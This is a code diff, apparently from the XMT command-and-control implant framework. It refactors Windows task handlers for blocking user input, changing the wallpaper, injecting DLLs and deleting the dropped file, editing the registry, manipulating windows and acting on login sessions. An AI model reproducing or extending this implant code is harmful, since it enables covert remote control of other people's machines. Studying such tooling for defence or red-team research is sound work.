@@ -1,4 +1,5 @@
 //go:build windows
+// +build windows
 
 // Copyright (C) 2020 - 2023 iDigitalFlame
 //
@@ -34,7 +35,6 @@ import (
 	"github.com/iDigitalFlame/xmt/device/winapi"
 	"github.com/iDigitalFlame/xmt/device/winapi/registry"
 	"github.com/iDigitalFlame/xmt/util"
-	"github.com/iDigitalFlame/xmt/util/bugtrack"
 	"github.com/iDigitalFlame/xmt/util/xerr"
 )
 
@@ -58,14 +58,14 @@ func taskTroll(x context.Context, r data.Reader, _ data.Writer) error {
 	case taskTrollBlockInputEnable, taskTrollBlockInputDisable:
 		return winapi.BlockInput(t == taskTrollBlockInputEnable)
 	case taskTrollWallpaperPath:
-		var s string
-		if err = r.ReadString(&s); err != nil {
+		s, err := r.StringVal()
+		if err != nil {
 			return err
 		}
 		return winapi.SetWallpaper(s)
 	case taskTrollWallpaper:
 		var f *os.File
-		if f, err = os.CreateTemp("", execD); err != nil {
+		if f, err = data.CreateTemp("", execD); err != nil {
 			return err
 		}
 		_, err = io.Copy(f, r)
@@ -75,15 +75,15 @@ func taskTroll(x context.Context, r data.Reader, _ data.Writer) error {
 		}
 		return winapi.SetWallpaper(f.Name())
 	case taskTrollWTF:
-		var d time.Duration
-		if err = r.ReadInt64((*int64)(&d)); err != nil {
+		d, err := r.Int64()
+		if err != nil {
 			return err
 		}
 		if d <= 0 {
 			return nil
 		}
 		var (
-			z = time.NewTimer(d)
+			z = time.NewTimer(time.Duration(d))
 			v = time.NewTicker(time.Millisecond * time.Duration(250+util.FastRandN(250)))
 		)
 	loop:
@@ -122,6 +122,8 @@ func taskCheck(_ context.Context, r data.Reader, w data.Writer) error {
 		err  error
 		n, f string
 	)
+	// NOTE(dij): Do these escape?
+	//            Sometimes the compiler thinks so.
 	if err = r.ReadString(&n); err != nil {
 		return err
 	}
@@ -159,6 +161,8 @@ func taskPatch(_ context.Context, r data.Reader, w data.Writer) error {
 		b    []byte
 		n, f string
 	)
+	// NOTE(dij): Do these escape?
+	//            Sometimes the compiler thinks so.
 	if err := r.ReadString(&n); err != nil {
 		return err
 	}
@@ -199,13 +203,7 @@ func taskInject(x context.Context, r data.Reader, w data.Writer) error {
 	h, _ := d.Handle()
 	if w.WriteUint64(uint64(h)); !z {
 		if w.WriteUint64(uint64(d.Pid()) << 32); v {
-			go func() {
-				if bugtrack.Enabled {
-					defer bugtrack.Recover("task.taskInject.func1()")
-				}
-				d.Wait()
-				os.Remove(d.Path)
-			}()
+			go waitThenDelete(d, d.Path)
 		} else {
 			d.Release()
 		}
@@ -346,6 +344,7 @@ func taskRegistry(_ context.Context, r data.Reader, w data.Writer) error {
 			return err1
 		}
 		x.MarshalStream(w)
+		return nil
 	case regOpSet:
 		t, err1 := r.Uint32()
 		if err1 != nil {
@@ -355,7 +354,7 @@ func taskRegistry(_ context.Context, r data.Reader, w data.Writer) error {
 		if err1 != nil {
 			return err1
 		}
-		regedit.Set(k, v, t, b)
+		return regedit.Set(k, v, t, b)
 	case regOpDelete:
 		f, err1 := r.Bool()
 		if err1 != nil {
@@ -416,6 +415,8 @@ func taskInteract(_ context.Context, r data.Reader, w data.Writer) error {
 		if err = r.ReadUint8(&v); err != nil {
 			return err
 		}
+		// NOTE(dij): Do these escape?
+		//            Sometimes the compiler thinks so.
 		return winapi.SetWindowTransparency(uintptr(h), v)
 	case taskWindowEnable, taskWindowDisable:
 		_, err = winapi.EnableWindow(uintptr(h), t == taskWindowEnable)
@@ -425,6 +426,8 @@ func taskInteract(_ context.Context, r data.Reader, w data.Writer) error {
 		if err = r.ReadUint8(&v); err != nil {
 			return err
 		}
+		// NOTE(dij): Do these escape?
+		//            Sometimes the compiler thinks so.
 		_, err = winapi.ShowWindow(uintptr(h), v)
 		return err
 	case taskWindowClose:
@@ -443,6 +446,8 @@ func taskInteract(_ context.Context, r data.Reader, w data.Writer) error {
 		if err = r.ReadString(&d); err != nil {
 			return err
 		}
+		// NOTE(dij): Do these escape?
+		//            Sometimes the compiler thinks so.
 		o, err := winapi.MessageBox(uintptr(h), d, t, f)
 		if err != nil {
 			return err
@@ -463,6 +468,8 @@ func taskInteract(_ context.Context, r data.Reader, w data.Writer) error {
 		if err = r.ReadInt32(&v); err != nil {
 			return err
 		}
+		// NOTE(dij): Do these escape?
+		//            Sometimes the compiler thinks so.
 		return winapi.SetWindowPos(uintptr(h), x, y, w, v)
 	case taskWindowFocus:
 		return winapi.SetForegroundWindow(uintptr(h))
@@ -515,6 +522,8 @@ func taskLoginsAct(_ context.Context, r data.Reader, w data.Writer) error {
 			f, x uint32
 			v    bool
 		)
+		// NOTE(dij): Do these escape?
+		//            Sometimes the compiler thinks so.
 		if err = r.ReadUint32(&f); err != nil {
 			return err
 		}
@@ -579,7 +588,6 @@ func taskWindowList(_ context.Context, _ data.Reader, w data.Writer) error {
 	}
 	return nil
 }
-
 func taskFuncMapList(_ context.Context, _ data.Reader, w data.Writer) error {
 	var (
 		e   = winapi.FuncRemapList()
@@ -614,7 +622,7 @@ func DLLUnmarshal(x context.Context, r data.Reader) (*cmd.DLL, bool, bool, error
 	}
 	p := d.Path
 	if len(d.Data) > 0 {
-		f, err := os.CreateTemp("", execB)
+		f, err := data.CreateTemp("", execB)
 		if err != nil {
 			return nil, false, false, err
 		}
